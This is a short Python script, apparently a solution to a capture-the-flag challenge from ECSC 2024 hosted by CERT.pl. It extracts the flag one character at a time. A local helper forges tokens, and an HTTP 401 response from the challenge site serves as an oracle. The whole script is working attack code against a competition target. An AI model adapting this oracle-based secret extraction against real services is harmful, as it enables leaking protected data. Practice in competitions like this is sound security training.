import requests
from string import printable

flag = 'ecsc24{'

while True:
    for c in printable:
        res = requests.post('http://localhost:5002/get_token', json={
            'content': f'{flag[-3:]}{c}'
        })
        token = res.text

        res = requests.get('https://nwaf.ecsc24.hack.cert.pl/hello', cookies={
            'access_token_cookie': token
        })

        if res.status_code == 401:
            flag += c
            print(flag)
            break
    else:
        break